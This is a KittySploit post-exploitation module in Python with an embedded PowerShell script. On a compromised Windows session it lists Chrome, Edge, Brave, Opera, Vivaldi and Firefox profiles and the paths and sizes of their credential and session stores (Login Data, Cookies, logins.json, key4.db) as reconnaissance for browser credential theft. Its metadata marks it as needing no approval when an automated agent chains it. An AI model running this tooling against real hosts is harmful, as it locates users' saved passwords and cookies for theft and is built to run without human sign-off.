#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Gather Browser Profile Audit",
        "description": "Enumerate browser profiles and sensitive artifact paths",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555/003/",
        ],
        "agent": {
            "risk": "passive",
            "effects": ["reconnaissance"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["risk_signals"],
            "cost": 0.4,
            "noise": 0.15,
            "value": 0.85,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": [],
            },
        },
    }

    include_extensions = OptBool(True, "List installed browser extensions per profile", False)
    max_profiles = OptInteger(8, "Maximum profiles to report per browser", False)

    def _audit_script(self) -> str:
        max_profiles = int(self.max_profiles or 8)
        include_ext = "true" if self.include_extensions else "false"
        return rf"""
$ErrorActionPreference = 'SilentlyContinue'
$maxProfiles = {max_profiles}
$includeExtensions = ${include_ext}

function Format-Size([long]$bytes) {{
    if ($bytes -ge 1GB) {{ return ('{{0:N2}} GB' -f ($bytes / 1GB)) }}
    if ($bytes -ge 1MB) {{ return ('{{0:N2}} MB' -f ($bytes / 1MB)) }}
    if ($bytes -ge 1KB) {{ return ('{{0:N2}} KB' -f ($bytes / 1KB)) }}
    return ('{{0}} B' -f $bytes)
}}

function Test-Artifact($path) {{
    if (-not (Test-Path -LiteralPath $path)) {{ return $null }}
    $item = Get-Item -LiteralPath $path -ErrorAction SilentlyContinue
    if (-not $item) {{ return $null }}
    return [PSCustomObject]@{{
        Path = $path
        Size = $item.Length
        SizeHuman = (Format-Size $item.Length)
        LastWrite = $item.LastWriteTime.ToString('s')
    }}
}}

function Get-ChromiumProfiles($browserName, $userDataRoot) {{
    if (-not (Test-Path -LiteralPath $userDataRoot)) {{ return @() }}
    $profiles = @()
    $dirs = Get-ChildItem -LiteralPath $userDataRoot -Directory -ErrorAction SilentlyContinue |
        Where-Object {{ $_.Name -match '^(Default|Profile \d+)$' }} |
        Select-Object -First $maxProfiles
    foreach ($dir in $dirs) {{
        $base = $dir.FullName
        $artifacts = @{{
            LoginData = Test-Artifact (Join-Path $base 'Login Data')
            Cookies = Test-Artifact (Join-Path $base 'Cookies')
            WebData = Test-Artifact (Join-Path $base 'Web Data')
            History = Test-Artifact (Join-Path $base 'History')
            Bookmarks = Test-Artifact (Join-Path $base 'Bookmarks')
            LocalState = Test-Artifact (Join-Path $userDataRoot 'Local State')
        }}
        $extensions = @()
        if ($includeExtensions) {{
            $extRoot = Join-Path $base 'Extensions'
            if (Test-Path -LiteralPath $extRoot) {{
                $extensions = Get-ChildItem -LiteralPath $extRoot -Directory -ErrorAction SilentlyContinue |
                    Select-Object -ExpandProperty Name
            }}
        }}
        $profiles += [PSCustomObject]@{{
            Browser = $browserName
            Profile = $dir.Name
            Path = $base
            Artifacts = $artifacts
            ExtensionCount = $extensions.Count
            Extensions = ($extensions | Select-Object -First 12)
        }}
    }}
    return $profiles
}}

function Get-FirefoxProfiles($profilesIni) {{
    $out = @()
    if (-not (Test-Path -LiteralPath $profilesIni)) {{ return $out }}
    $root = Split-Path -Parent $profilesIni
    $lines = Get-Content -LiteralPath $profilesIni -ErrorAction SilentlyContinue
    $current = @{{}}
    $sections = @()
    foreach ($line in $lines) {{
        if ($line -match '^\[(.+)\]$') {{
            if ($current.Count -gt 0) {{ $sections += [PSCustomObject]$current }}
            $current = @{{ Section = $matches[1] }}
        }} elseif ($line -match '^([^=]+)=(.*)$') {{
            $current[$matches[1].Trim()] = $matches[2].Trim()
        }}
    }}
    if ($current.Count -gt 0) {{ $sections += [PSCustomObject]$current }}

    $profileSections = $sections | Where-Object {{ $_.Section -like 'Profile*' }} | Select-Object -First $maxProfiles
    foreach ($sec in $profileSections) {{
        $rel = $sec.Path
        if (-not $rel) {{ continue }}
        $base = if ([IO.Path]::IsPathRooted($rel)) {{ $rel }} else {{ Join-Path $root $rel }}
        if (-not (Test-Path -LiteralPath $base)) {{ continue }}
        $artifacts = @{{
            LoginsJson = Test-Artifact (Join-Path $base 'logins.json')
            Key4Db = Test-Artifact (Join-Path $base 'key4.db')
            CookiesSqlite = Test-Artifact (Join-Path $base 'cookies.sqlite')
            PlacesSqlite = Test-Artifact (Join-Path $base 'places.sqlite')
            FormHistory = Test-Artifact (Join-Path $base 'formhistory.sqlite')
        }}
        $profileName = if ($sec.Name) {{ $sec.Name }} else {{ $sec.Section }}
        $out += [PSCustomObject]@{{
            Browser = 'Firefox'
            Profile = $profileName
            Path = $base
            IsRelative = ($sec.IsRelative -eq '1')
            Artifacts = $artifacts
            ExtensionCount = 0
            Extensions = @()
        }}
    }}
    return $out
}}

$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$user = $env:USERPROFILE

$targets = @(
    @{{ Name = 'Chrome'; UserData = Join-Path $local 'Google\Chrome\User Data' }},
    @{{ Name = 'Edge'; UserData = Join-Path $local 'Microsoft\Edge\User Data' }},
    @{{ Name = 'Brave'; UserData = Join-Path $local 'BraveSoftware\Brave-Browser\User Data' }},
    @{{ Name = 'Opera'; UserData = Join-Path $roaming 'Opera Software\Opera Stable' }},
    @{{ Name = 'OperaGX'; UserData = Join-Path $roaming 'Opera Software\Opera GX Stable' }},
    @{{ Name = 'Vivaldi'; UserData = Join-Path $local 'Vivaldi\User Data' }}
)

$report = @{{
    Host = $env:COMPUTERNAME
    User = $env:USERNAME
    Browsers = @()
    Profiles = @()
    SensitivePaths = @()
}}

foreach ($t in $targets) {{
    if (Test-Path -LiteralPath $t.UserData) {{
        $report.Browsers += [PSCustomObject]@{{
            Name = $t.Name
            UserData = $t.UserData
        }}
        $report.Profiles += Get-ChromiumProfiles -browserName $t.Name -userDataRoot $t.UserData
    }}
}}

$ffProfiles = Get-FirefoxProfiles (Join-Path $roaming 'Mozilla\Firefox\profiles.ini')
if ($ffProfiles.Count -gt 0) {{
    $report.Browsers += [PSCustomObject]@{{
        Name = 'Firefox'
        UserData = Join-Path $roaming 'Mozilla\Firefox'
    }}
    $report.Profiles += $ffProfiles
}}

foreach ($p in $report.Profiles) {{
    foreach ($key in $p.Artifacts.Keys) {{
        $artifact = $p.Artifacts[$key]
        if ($artifact) {{
            $report.SensitivePaths += "$($p.Browser)/$($p.Profile) — $key => $($artifact.Path) [$($artifact.SizeHuman)]"
        }}
    }}
}}

$report | ConvertTo-Json -Depth 8 -Compress
"""

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        print_info("=" * 60)
        print_info("Browser profile audit")

        raw = self.win_run_powershell(self._audit_script(), timeout=30)
        if not raw:
            print_warning("Browser profile collector returned no output")
            return False

        try:
            import json

            data = json.loads(raw.strip().splitlines()[-1])
        except Exception as exc:
            print_error(f"Failed to parse browser profile audit output: {exc}")
            print_info(raw[:2000])
            return False

        browsers = data.get("Browsers", [])
        profiles = data.get("Profiles", [])
        sensitive = data.get("SensitivePaths", [])

        if not browsers:
            print_status("No common browser user-data directories found for this user")
            return True

        print_success(f"Detected {len(browsers)} browser installation(s)")
        for browser in browsers:
            print_info(f"  • {browser.get('Name', '?')}: {browser.get('UserData', '')}")

        print_info("-" * 60)
        print_info(f"Profiles inspected: {len(profiles)}")
        for profile in profiles:
            name = profile.get("Browser", "?")
            prof = profile.get("Profile", "?")
            path = profile.get("Path", "")
            print_info(f"  [{name}] {prof}")
            print_info(f"    Path: {path}")
            artifacts = profile.get("Artifacts", {}) or {}
            for key, artifact in artifacts.items():
                if not artifact:
                    continue
                print_info(
                    f"    {key}: {artifact.get('SizeHuman', '?')} "
                    f"(mtime {artifact.get('LastWrite', '?')})"
                )
            ext_count = profile.get("ExtensionCount", 0)
            if ext_count:
                exts = profile.get("Extensions", [])
                preview = ", ".join(exts[:4])
                if ext_count > 4:
                    preview += f", +{ext_count - 4} more"
                print_info(f"    Extensions: {ext_count} ({preview})")

        if sensitive:
            print_info("-" * 60)
            print_warning("Sensitive artifact paths (DPAPI-protected where applicable):")
            for line in sensitive[:25]:
                print_info(f"  {line}")
            if len(sensitive) > 25:
                print_info(f"  ... {len(sensitive) - 25} more path(s)")

        print_info("=" * 60)
        return True
